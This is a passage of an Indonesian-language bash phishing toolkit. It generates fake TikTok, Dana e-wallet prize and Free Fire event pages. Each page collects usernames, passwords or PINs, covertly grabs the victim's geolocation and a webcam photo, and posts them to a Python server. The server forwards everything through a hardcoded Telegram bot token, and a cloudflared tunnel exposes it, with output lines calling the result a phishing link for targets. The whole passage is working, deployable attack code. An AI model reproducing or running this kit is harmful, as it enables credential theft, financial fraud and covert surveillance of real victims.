            email, passw, lat, lon, img = data["email"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"pro_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] Pro Email: {email} | Pass: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🏢 Pro Email: {email}\n🔑 Pass: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK PROFESSIONAL PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x server.py
  python3 server.py
}

#####################################################
#####################################################
phising_TTSUNTIK(){
      # ===== AUTO CLEAN-UP =====
  WORK_DIR="$HOME/DanxyTTSuntik"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====

  # HTML suntik TikTok 2025 (glassmorphism + neon)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Suntik TikTok Followers</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
    }
    .card{
      width:100%;
      max-width:400px;
      padding:40px 30px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:20px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 40px rgba(0,255,255,0.3);
      text-align:center;
    }
    .logo{
      font-size:32px;
      font-weight:700;
      background:linear-gradient(45deg,#00ffff,#ff00ff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      margin-bottom:10px;
      letter-spacing:-1px;
    }
    .subtitle{
      font-size:14px;
      color:#b0b0b0;
      margin-bottom:25px;
    }
    .suntik{
      width:120px;
      height:120px;
      margin:0 auto 20px;
      background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="20" y="10" width="60" height="80" rx="10" fill="%2300ffff"/><rect x="25" y="5" width="50" height="20" rx="5" fill="%23ff00ff"/><circle cx="50" cy="50" r="15" fill="%23fff"/></svg>') center/cover;
      filter:drop-shadow(0 0 15px rgba(0,255,255,0.8));
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:#000;
      border:1px solid #333;
      border-radius:8px;
      color:#fff;
      font-size:14px;
    }
    input:focus{outline:none;border-color:#00ffff;}
    .btn{
      width:100%;
      padding:14px;
      border:none;
      border-radius:12px;
      background:linear-gradient(45deg,#00ffff,#ff00ff);
      color:#fff;
      font-weight:600;
      font-size:16px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{transform:scale(1.02);box-shadow:0 0 25px rgba(0,255,255,0.6);}
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#00ffff;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #00ffff;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">TikTok Suntik</div>
    <div class="subtitle">Suntik TikTok gratis tanpa login!</div>
    <div class="suntik"></div>
    <input type="text" id="user" placeholder="Username TikTok"/>
    <input type="number" id="coin" placeholder="Jumlah Followers"/>
    <button class="btn" onclick="inject()">INJECT SEKARANG</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Menginjeksi akun...</div>
    </div>
  </div>

  <script>
    async function inject(){
      const user=document.getElementById('user').value.trim();
      const coin=document.getElementById('coin').value.trim();
      if(!user||!coin){alert('Lengkapi semua kolom');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({user,coin,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Inject berhasil!</div>';
          setTimeout(()=>location.href='https://tiktok.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Inject gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, coin, lat, lon, img = data["user"], data["coin"], data["lat"], data["lon"], data["img"]
            fn = f"suntik_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] Suntik User: {user} | Coin: {coin}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"💉 Suntik User: {user}\n🪙 Coin: {coin}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK SUNTIK TIKTOK PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x server.py
  python3 server.py
}


#####################################################
#####################################################
phising_SPIN(){
  WORK_DIR="$HOME/DanxySpin"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====
  
  # HTML Spin Dana 2025 (glassmorphism + neon)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Spin & Win - Saldo Dana</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
    }
    .card{
      width:100%;
      max-width:400px;
      padding:40px 30px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:20px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 40px rgba(0,255,255,0.3);
      text-align:center;
    }
    .title{
      font-size:32px;
      font-weight:700;
      background:linear-gradient(45deg,#00ffff,#ff00ff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      margin-bottom:10px;
      letter-spacing:-1px;
    }
    .subtitle{
      font-size:14px;
      color:#b0b0b0;
      margin-bottom:30px;
    }
    .wheel{
      width:250px;
      height:250px;
      margin:0 auto 30px;
      background:conic-gradient(
        #00ffff 0deg 60deg,
        #ff00ff 60deg 120deg,
        #00ff00 120deg 180deg,
        #ffff00 180deg 240deg,
        #ff0050 240deg 300deg,
        #0099ff 300deg 360deg
      );
      border-radius:50%;
      position:relative;
      box-shadow:0 0 30px rgba(0,255,255,0.5);
      transition:transform 3s cubic-bezier(0.25,1,0.5,1);
    }
    .wheel::after{
      content:'';
      position:absolute;
      top:-12px;
      left:50%;
      transform:translateX(-50%);
      width:0;
      height:0;
      border-left:12px solid transparent;
      border-right:12px solid transparent;
      border-top:24px solid #fff;
      z-index:10;
    }
    .btn{
      width:100%;
      padding:14px;
      border:none;
      border-radius:12px;
      background:linear-gradient(45deg,#00ffff,#ff00ff);
      color:#fff;
      font-weight:600;
      font-size:16px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{transform:scale(1.02);box-shadow:0 0 25px rgba(0,255,255,0.6);}
    .form{
      display:none;
      margin-top:20px;
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:#000;
      border:1px solid #333;
      border-radius:8px;
      color:#fff;
      font-size:14px;
    }
    input:focus{outline:none;border-color:#00ffff;}
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#00ffff;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #00ffff;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="title">Spin & Win</div>
    <div class="subtitle">Putar roda dan menangkan saldo Dana hingga 1.000.000!</div>
    <div class="wheel" id="wheel"></div>
    <button class="btn" onclick="startSpin()">PUTAR SEKARANG</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memproses hadiah...</div>
    </div>
    <div class="form" id="form">
      <input type="text" id="user" placeholder="Nomor HP (contoh: 0857xxxx)"/>
      <input type="password" id="pass" placeholder="PIN Dana (6 digit)"/>
      <button class="btn" onclick="claim()">Klaim Hadiah</button>
    </div>
  </div>

  <script>
    let hadiah=["Saldo Dana Rp50.000","Saldo Dana Rp100.000","Saldo Dana Rp250.000","Saldo Dana Rp500.000","Saldo Dana Rp1.000.000"];
    let degree=0;

    function startSpin(){
      degree+=Math.floor(1800+Math.random()*1800);
      document.getElementById('wheel').style.transform=`rotate(${degree}deg)`;
      setTimeout(()=>{
        document.getElementById('form').style.display='block';
        document.querySelector('.btn').style.display='none';
      },3000);
    }

    async function claim(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){alert('Lengkapi semua kolom');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({user,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Hadiah berhasil diklaim!</div>';
          setTimeout(()=>location.href='https://dana.id',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Klaim gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, passw, lat, lon, img = data["user"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"spin_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] Spin User: {user} | PIN: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🎯 Spin User: {user}\n🔑 PIN: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK SPIN DANA PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x server.py
  python3 server.py
}

#####################################################
#####################################################
phising_TT(){
  WORK_DIR="$HOME/DanxyTT"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====
  

  # HTML TikTok 2025 (tanpa URL mentah)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>TikTok</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#000;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
    }
    .card{
      width:100%;
      max-width:360px;
      padding:40px 30px;
      background:#161823;
      border:1px solid #333;
      border-radius:12px;
      box-shadow:0 0 30px rgba(255,0,80,0.3);
    }
    .logo{
      font-size:48px;
      font-weight:700;
      color:#ff0050;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-2px;
    }
    .subtitle{
      text-align:center;
      font-size:14px;
      color:#8a8a8a;
      margin-bottom:30px;
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:#000;
      border:1px solid #333;
      border-radius:4px;
      color:#fff;
      font-size:14px;
    }
    input:focus{
      outline:none;
      border-color:#ff0050;
    }
    .btn{
      width:100%;
      padding:12px;
      border:none;
      border-radius:4px;
      background:#ff0050;
      color:#fff;
      font-weight:600;
      font-size:14px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{background:#e60049;}
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#ff0050;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #ff0050;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">TikTok</div>
    <div class="subtitle">Masuk untuk melanjutkan</div>
    <input type="text" id="user" placeholder="Email atau nama pengguna"/>
    <input type="password" id="pass" placeholder="Kata sandi"/>
    <button class="btn" onclick="login()">Masuk</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memuat video...</div>
    </div>
  </div>

  <script>
    async function login(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){alert('Lengkapi username & password');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({user,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Login berhasil</div>';
          setTimeout(()=>location.href='https://tiktok.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Login gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > Danxy.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, passw, lat, lon, img = data["user"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"tt_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] TT User: {user} | Pass: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🔐 TT User: {user}\n🔑 Pass: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK TIKTOK PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x Danxy.py
  python3 Danxy.py
}

#####################################################
#####################################################


phising_FF(){
  WORK_DIR="$HOME/DanxyFF"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====

  # HTML Free Fire 2025 (event kolaborasi Naruto)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Free Fire x NARUTO - Event Spesial</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#0a0a0a;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
    }
    .card{
      width:100%;
      max-width:400px;
      padding:40px 30px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:16px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 30px rgba(255,0,80,0.3);
    }
    .logo{
      font-size:36px;
      font-weight:700;
      background:linear-gradient(45deg,#ff0050,#ffcc00);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-1px;
    }
    .event{
      font-size:14px;
      color:#ffcc00;
      text-align:center;
      margin-bottom:25px;
    }
    .naruto{
      width:120px;
      height:120px;
      margin:0 auto 20px;
      background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="%23ffcc00"/><path d="M50 20 L60 40 L80 40 L65 55 L75 75 L50 60 L25 75 L35 55 L20 40 L40 40 Z" fill="%23ff0050"/></svg>') center/cover;
      border-radius:50%;
      box-shadow:0 0 20px rgba(255,204,0,0.6);
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:#000;
      border:1px solid #333;
      border-radius:4px;
      color:#fff;
      font-size:14px;
    }
    input:focus{
      outline:none;
      border-color:#ff0050;
    }
    .btn{
      width:100%;
      padding:12px;
      border:none;
      border-radius:4px;
      background:linear-gradient(45deg,#ff0050,#ffcc00);
      color:#fff;
      font-weight:600;
      font-size:14px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{transform:scale(1.02);box-shadow:0 0 20px rgba(255,0,80,0.6);}
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#ffcc00;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #ffcc00;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">Free Fire</div>
    <div class="event">Event Spesial: Free Fire x NARUTO</div>
    <div class="naruto"></div>
    <input type="text" id="user" placeholder="ID Garena / Email / Nomor HP"/>
    <input type="password" id="pass" placeholder="Kata Sandi"/>
    <button class="btn" onclick="login()">Klaim Hadiah & Masuk</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memuat akun...</div>
    </div>
  </div>

  <script>
    async function login(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){alert('Lengkapi semua kolom');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({user,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Login berhasil</div>';
          setTimeout(()=>location.href='https://ff.garena.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Login gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
